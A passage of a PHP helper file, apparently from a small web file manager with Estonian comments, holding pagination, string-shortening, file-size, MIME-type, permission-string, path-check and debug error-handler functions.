			$url = str_replace('__CURRENT_PAGE__',$pages,$pageurl);
			$return['navbar'][] = sprintf('<a href="%s">%s</a>', $url, '-&gt;');
		}

	}

	// limit päringus kasutamiseks
	$limit_1 = ($page-1)*$perpage;

	// $limit_2 asemel võiks panna $perpage 
	// kuid igaks juhuks arvutab selle ka välja, kuna 
	// see on abiks nt massiivi korral
	$limit_2 = $limit_1 + $perpage > $total ? $total-$limit_1: $perpage;
	$return['limit'] = $limit_1 . ', '.$limit_2;

	// aktiivne lehekülg
	$return['current'] = $page;

	// lehekülgede arv kokku
	$return['total'] = $total;

	return $return;
}

/**
 * cuts string shorter , if it's longer than gived length
 *
 * @param string $str
 * @param int $len
 * @return string
 */
function cut_short0($str, $len=40)
{
		if(strlen($str) > $len)
		{
			$str = substr($str, 0, $len-2).'...';
		}
		return $str;
}



/**
 * cuts string shorter , doesn't break words
 *
 * @link http://php.center.ee/vaatafoorumiteemat.php?id=5109
 * @param string $tekst
 * @param itn $pikkus
 * @param string $eraldaja
 * @return string
 */
function cut_short($tekst, $pikkus, $eraldaja = ' ') 
{ 
      if (strlen($tekst) <= $pikkus) return $tekst; 
      $tekst = substr($tekst, 0, (int)$pikkus); 
      $pos = strrpos($tekst, $eraldaja); 
      if($pos === false) return $tekst.'...'; 
      return trim(substr($tekst, 0, $pos + 1)).'...'; 
}

/**
 * same as stripslashes but works for nested arrays
 *
 * @param mixed $thing
 * @return mixed
 */
function deep_strip_slashes($thing) {
	if (is_array($thing)) {
		return array_map('deep_strip_slashes', $thing);
/*		$striped = array();
 
		foreach ($thing as $key => $value) {
			$striped[$key] = deep_strip_slashes($value);
		}
		return $striped;
*/	}

	return stripslashes($thing);
}

/**
 * checks if path contains illegal characters (for demo mode)
 *
 * @param  string $path
 * @return boolean
 */
function is_forbidden($path)
{
	return (strstr($path, '..') || $path{0}=='/' || $path{1}==':');
}

/**
 * adds / if there arent it as last mark
 *
 * @param string $path
 * @return string
 */
function add_slash_if_needed($path)
{
	if(substr($path, -1)!='/')
		$path .= '/';
	return $path;
}

/**
 * human readable age
 *
 * @param integer $unixtimestamp
 * @return string
 */
function how_old($unixtimestamp)
{
	$iga = time() - $unixtimestamp;

	$minut	= 60;
	$tund	= $minut * 60;
	$paev	= $tund * 24;
	$nadal	= $paev * 7;
	$kuu	= ($nadal * 4) + (2.5 * $paev);
	$aasta	= $kuu * 12;

	if($iga < $minut)
	{
		return pluralize($iga, 'second', 'seconds');
	}
	elseif($iga < $tund)
	{
		return pluralize(ceil($iga / $minut), 'minute', 'minutes');
	}
	elseif($iga < $paev)
	{
		return  pluralize(ceil($iga / $tund), 'hour', ' hours');
	}
	elseif($iga < $nadal)
	{
		return pluralize(ceil($iga / $paev), 'day', 'days');
	}
	elseif($iga < $kuu)
	{
		return pluralize(ceil($iga / $nadal), 'week', ' weeks');
	}
	elseif($iga < $aasta)
	{
		return pluralize(ceil($iga / $kuu), 'month', 'months');
	}
	else
	{
		return pluralize(ceil($iga / $aasta), 'year', 'years');
	}
}

function pluralize($number, $word1, $word2)
{
	return ($number==1) ? $number . ' ' . $word1 : $number . ' ' . $word2;
}

/**
 * human readable filesize
 *
 * @param int $bytes filesize
 * @param string $format sprintf format to show size
 * @param string $force force units
 * @return string
 */
function filesize_format($bytes, $format = '', $force = '')
{
	$force = strtoupper($force);
	$defaultFormat = '%01d %s';
	if (strlen($format) == 0)
		$format = $defaultFormat;

	$bytes = max(0, (int) $bytes);

	$units = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');

	$power = array_search($force, $units);

	if ($power === false)
		$power = $bytes > 0 ? floor(log($bytes, 1024)) : 0;

	if($power == 0)
		return sprintf($defaultFormat, $bytes, $units[0]);
	else
		return sprintf($format, $bytes / pow(1024, $power), $units[$power]);
}

/**
 * returns file mimetype
 *
 * @param string $filename
 * @return string
 */
function getmimetype ($filename) 
{
	static $mimes = array(
		'\.jpg$|\.jpeg$'  => 'image/jpeg',
		'\.gif$'          => 'image/gif',
		'\.png$'          => 'image/png',
		'\.html$|\.html$' => 'text/html',
		'\.txt$|\.asc$'   => 'text/plain',
		'\.xml$|\.xsl$'   => 'application/xml',
		'\.pdf$'          => 'application/pdf'
	);

	foreach ($mimes as $regex => $mime) 
	{
		if (eregi($regex, $filename)) return $mime;
	}

	return 'text/plain';
}

/**
 * returns
 *
 * @param string $file
 * @return string
 */
function getperms($file)
{
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
   // Socket
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   // Symbolic Link
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   // Regular
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   // Block special
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   // Directory
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   // Character special
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   // FIFO pipe
   $info = 'p';
} else {
   // Unknown
   $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
// Define a simple error handler 
function error_handler ($level, $message, $file, $line, $context) 
{
	if(!debug) return "";
	
	$errortype = array (
		E_ERROR           => "Error",
		E_WARNING         => "Warning",
		E_PARSE           => "Parsing Error",
		E_NOTICE          => "Notice",
		E_CORE_ERROR      => "Core Error",
		E_CORE_WARNING    => "Core Warning",
		E_COMPILE_ERROR   => "Compile Error",
		E_COMPILE_WARNING => "Compile Warning",
		E_USER_ERROR      => "User Error",
		E_USER_WARNING    => "User Warning",
		E_USER_NOTICE     => "User Notice",
		E_STRICT          => "Runtime Notice"
	);

	$tpl_vars = array();
	$tpl_vars['menu'] = get_menu();
	$tpl_vars['mainbody'] = "<h1>error!</h1>
	<p>".$errortype[$level]." was generated in file $file on line $line. </p>
<p>The error message was: <span class=\"error\">$message</span></p>
<p>The following variables were set in the scope that the error occurred in:</p>

<blockquote><pre>";
	$tpl_vars['mainbody'] .= print_r ($context, true);
	$tpl_vars['mainbody'] .= "\n</pre></blockquote>";
	
	$tpl_vars['body'] = parse_tpl(get_tpl('mainbody'), $tpl_vars);
	
	echo parse_tpl(get_tpl('html'), $tpl_vars);
	
	exit;
}

function setif(&$variable, $value)
{
	return isset($variable) ? $variable : $value;
}

// EOF :)

?>
